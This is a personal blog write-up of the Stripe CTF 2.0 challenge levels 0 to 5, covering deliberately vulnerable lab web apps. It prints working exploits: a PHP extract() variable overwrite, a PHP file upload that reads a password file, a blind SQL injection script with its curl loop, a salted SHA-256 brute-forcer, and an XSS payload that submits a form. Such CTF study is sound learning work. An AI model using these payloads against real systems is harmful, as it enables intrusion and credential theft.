@@ -1,0 +1,378 @@
+---
+title: Stripe CTF 2.0 (partial) writeup
+author: Etienne Millon
+tags: stripe, ctf, security
+---
+
+The [Stripe CTF 2.0][StripeCTF] is over ! Massive props to [Stripe] for this
+great edition. I was stuck on level 5 but here is a humble writeup.
+
+Level 0 : the Secret Safe
+-------------------------
+
+The first level is a web application written in [node.js][NodeJS] that holds a
+password in a SQLite database.
+
+The error is in following line :
+
+~~~~ {.javascript}
+var query = 'SELECT * FROM secrets WHERE key LIKE ? || ".%"';
+~~~~
+
+"LIKE" interprets its argument as a regular expression. The solution is thus to
+pass it a regular expression which matches everything : entering "%" reveals the
+password.
+
+Level 1 : the Guessing Game
+---------------------------
+
+Here we have the following PHP script :
+
+~~~~ {.php}
+<html>
+  <head>
+    <title>Guessing Game</title>
+  </head>
+  <body>
+    <h1>Welcome to the Guessing Game!</h1>
+    <p>
+      Guess the secret combination below, and if you get it right,
+      you'll get the password to the next level!
+    </p>
+    <?php
+      $filename = 'secret-combination.txt';
+      extract($_GET);
+      if (isset($attempt)) {
+        $combination = trim(file_get_contents($filename));
+        if ($attempt === $combination) {
+          echo "<p>How did you know the secret combination was" .
+               " $combination!?</p>";
+          $next = file_get_contents('level02-password.txt');
+          echo "<p>You've earned the password to the access Level 2:" .
+               " $next</p>";
+        } else {
+          echo "<p>Incorrect! The secret combination is not $attempt</p>";
+        }
+      }
+    ?>
+    <form action="#" method="GET">
+      <p><input type="text" name="attempt"></p>
+      <p><input type="submit" value="Guess!"></p>
+    </form>
+  </body>
+</html>
+~~~~
+
+The intent is that the script receives an "attempt" parameter, reads a file and
+compares the attempt with the file contents. But it uses a very insecure method
+of doing so : the function `extract` copies its associative array argument
+directly into the symbol table.
+
+For example, the following script :
+
+~~~~ {.php}
+<?php
+$vars = array('a' => 2, 'b' => 'foo');
+extract($vars);
+echo "a = $a, b = $b\n";
+?>
+~~~~
+
+outputs :
+
+~~~~ 
+a = 2, b = foo
+~~~~
+
+As the argument `$_GET` is controlled by the attacker, it means that we can
+overwrite any variable, including `$filename`. By providing the script the name
+of another file whose contents are known, we can bypass the check. There's a
+very good candidate for such a file : `index.php` itself.
+
+So, let's url-encode the file (we also have to trim the last newline) and issue
+the following GET request with curl :
+
+~~~~ 
+% curl localhost:8000/index.php \
+    -G \
+    -d filename=index.php \
+    -d attempt=$(perl -MURI::Escape \
+        -e '{local $/; $_=<>;} chomp; print uri_escape $_' \
+        <index.php)
+[...]
+</html>!?</p><p>You've earned the password to the access Level 2: dummy-password
+[...]
+~~~~
+
+Level 2 : the Social Network
+----------------------------
+
+Level 2 is a small script, also in PHP, where you can upload a picture and
+display it. But it's also done in an insecure way :
+
+  - the files are uploaded in a visible folder
+  - any file extension is allowed
+  - the server will execute everything with a `.php` extension
+
+Have a small idea ? :) We can write a PHP script, upload it and execute from the
+upload directory. If it contains code to read the secret password, we're done :
+
+~~~~ {.php}
+<?php
+echo (file_get_contents("../password.txt"));
+?>
+~~~~
+
+Level 3 : the Secret Vault
+--------------------------
+
+The next level is a small application where you enter a login and a password,
+and if it matches one in the database, you have access to a secret. This time it
+is written in Python, using the [Flask] microframework. Better than PHP but it
+seems that the (fictional) developer has never heard about SQL injections !
+
+The relevant lines are :
+
+~~~~ {.python}
+query = """SELECT id, password_hash, salt FROM users
+           WHERE username = '{0}' LIMIT 1""".format(username)
+cursor.execute(query)
+
+res = cursor.fetchone()
+if not res:
+    return "There's no such user {0}!\n".format(username)
+user_id, password_hash, salt = res
+
+calculated_hash = hashlib.sha256(password + salt)
+if calculated_hash.hexdigest() != password_hash:
+    return "That's not the password for {0}!\n".format(username)
+~~~~
+
+The query is vulnerable to SQL injections : if `username` contains a quote, it
+will close the other one. For example, if it is `' OR 1=1 --`, the full query
+will be a valid one : `SELECT id, password_hash, salt FROM users WHERE username
+= '' OR 1=1 --' LIMIT 1""".format(username)`.
+
+~~~~ 
+% curl http://localhost:5000/login -d "username=' OR 1=1 --" -d password=foo
+That's not the password for ' OR 1=1 --!
+~~~~
+
+Note that the error message is different when the query evaluates to something
+false :
+ 
+~~~~ 
+% curl http://localhost:5000/login -d "username=' OR 1=2 --" -d password=foo
+There's no such user ' OR 1=2 --!
+~~~~
+
+This means that we have a way to evaluate arbitrary (boolean) expressions. Using
+subqueries, we can get information from the database :
+
+~~~~ 
+% curl http://localhost:5000/login \
+  -d "username=' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob') --"\
+  -d password=foo
+That's not the password for ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob') --!
+% curl http://localhost:5000/login \
+  -d "username=' OR 1=(SELECT COUNT(*) FROM users WHERE username='alice') --"\
+  -d password=foo
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='alice') --!
+~~~~
+
+The DB contains a user named "bob" but no user named "alice". What about his
+password hash?
+
+~~~~ 
+% for p in $(seq 0 9) a b c d e f ; do
+curl http://localhost:5000/login \
+  -d "username=' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '$p%') --"\
+  -d password=foo
+done
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '0%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '1%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '2%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '3%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '4%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '5%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '6%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '7%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '8%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE '9%') --!
+That's not the password for ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE 'a%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE 'b%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE 'c%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE 'd%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE 'e%') --!
+There's no such user ' OR 1=(SELECT COUNT(*) FROM users WHERE username='bob' AND password_hash LIKE 'f%') --!
+~~~~
+
+So, the hash starts by a "a". By scripting this, we can get bob's password hash
+and salt (from `generate_data.py` we know that the salt and the password are
+made of 7 lowercase letters).
+
+~~~~ {.python}
+#!/usr/bin/env python
+import hashlib
+import itertools
+import requests
+import string
+
+def is_ok(query):
+    full_query = "' OR 1=" + query + " --"
+    payload = {'username': full_query, 'password' : 'foo' }
+    url = "http://localhost:5000/login"
+    r = requests.post(url, data=payload)
+    return "not the password for" in r.text
+
+def next_char(user, field, chars, prefix):
+    for c in chars:
+        q = "(SELECT COUNT(*) FROM users "\
+            + "WHERE username = '{0}' "\
+            + "AND {1} LIKE '{2}{3}%')"
+        if is_ok(q.format(user, field, prefix, c)):
+            return c
+    print prefix
+    return None 
+
+def crack(user, field, chars):
+    prefix = ''
+    while True:
+        c = next_char(user, field, chars, prefix)
+        if c is None:
+            return
+        prefix += c
+
+if __name__ == '__main__':
+    crack('bob', 'password_hash', string.hexdigits)
+    crack('bob', 'salt', string.ascii_lowercase)
+~~~~
+
+And the output is something like :
+
+~~~~ 
+% ./level3.py
+aee3d87d877c39d68e49c2c6e47789de3de40a73e2970fe2355011649932f5bb
+zxqtgxi
+~~~~
+
+Gereating all strings and their hashes is a bit too slow in Python, so I put
+together a small C program to do the heavy work.
+
+~~~~ {.c}
+#include <openssl/sha.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char **argv)
+{
+
+    char salt[] = "zxqtgxi";
+    unsigned char expected_hash[] =
+        "\xae\xe3\xd8\x7d\x87\x7c\x39\xd6"
+        "\x8e\x49\xc2\xc6\xe4\x77\x89\xde"
+        "\x3d\xe4\x0a\x73\xe2\x97\x0f\xe2"
+        "\x35\x50\x11\x64\x99\x32\xf5\xbb";
+
+    char s[15];
+    memcpy(&s[7], salt, 7);
+
+    unsigned char hash[SHA256_DIGEST_LENGTH];
+    SHA256_CTX sha256;
+
+#define LOOP(n) for(s[n]='a';s[n]<='z';s[n]++)
+
+    LOOP(0) LOOP(1) LOOP(2)
+    LOOP(3) LOOP(4) LOOP(5)
+    LOOP(6) {
+        SHA256_Init(&sha256);
+        SHA256_Update(&sha256, s, 14);
+        SHA256_Final(hash, &sha256);
+        if(!memcmp(hash, expected_hash,
+                    SHA256_DIGEST_LENGTH)) {
+            printf("FOUND : %s\n", s);
+            exit(0);
+        }
+    }
+
+    return 0;
+}
+~~~~
+
+A few minutes later, we have the answer.
+
+Level 4 : the Karma Trader
+--------------------------
+
+New level, new language : Ruby this time. In the application written with the
+[Sinatra] framework, you can create accounts and transfer an amount of karma to
+another user, with the rule that once you transferred karma to a user, he can
+see your password. The goal is to get *karma_fountain*'s password, with the
+indication that he logs in often.
+
+This is a good indication that it will be a XSS attack in *karma_fountain*'s
+browser : by injecting a piece of javascript into the page, we'll fill and
+submit the transfer form. The obvious vector is the username ; alas it is
+filtered :
+
+~~~~ {.ruby}
+unless username =~ /^\w+$/
+  die("Invalid username. Usernames must match /^\w+$/", :register)
+end
+~~~~
+
+But as the password is presented, it is also a possibility. It turns out that it
+is not filtered, and thus exploitable.
+
+Let's create a user "x" with the following password:
+
+~~~~ {.javascript}
+<script>
+  var f = document.forms[0];
+  f['to'].value="x";
+  f['amount'].value="100";
+  f.submit();
+</script>
+~~~~
+
+And to deliver this payload, we just have to send karma to *karma_fountain*. A
+minute later or so, its password appears.
+
+Level 5 : the DomainAuthenticator
+---------------------------------
+
+I couldn't finish this level. This level is also a [Sinatra] web application,
+which can make POST requests to hosts ending in `stripe-ctf.com`. When the
+response contains "AUTHENTICATED", you are marked as logged in as this host. The
+goal is to log in as a host name matching `^level05-\d+\.stripe-ctf\.com$`.
+I tried two different techniques.
+
+The first one is to have the level 5 host make a request to itself, so that this
+request triggers another request to an arbitrary controlled server (the server
+from level 2 can be used for this). The main problem is that the application
+needs 3 parameters : "username", "password" and "pingback", and it passes the
+only first two of them to the pingback URL. I tried header injection (injecting
+a `&pingback=...` at the end of the password), but it was filtered out.
+
+The second one is to slightly abuse HTTP : a same host can have two hostnames
+and serve a different content depending on the "Host:" HTTP header. If the level
+2 and level 5 run on the same IP, we could run a custom HTTP server on a high
+port, so that the POST would succeed (this would work because there is no check
+that the port is 80). Unfortunately, the two levels run on different hosts, so
+this does not work.
+
+Other levels
+------------
+
+A lot of complete solutions have been published since, for example [this
+one][FullSolution]. I'm quite frustrated because I'm almost sure that I tried
+adding a `?pingback` parameter on level 5. Anyway, I hope that the next edition
+will be as interesting as this one, and that this time, I'll win a t-shirt :)
+
+[Flask]:        http://flask.pocoo.org/
+[FullSolution]: http://blog.matthewdfuller.com/2012/08/stripe-capture-flag-level-by-level.html
+[NodeJS]:       http://nodejs.org/
+[Sinatra]:      http://sinatrarb.com/
+[StripeCTF]:    https://stripe-ctf.com/
+[Stripe]:       https://stripe.com/
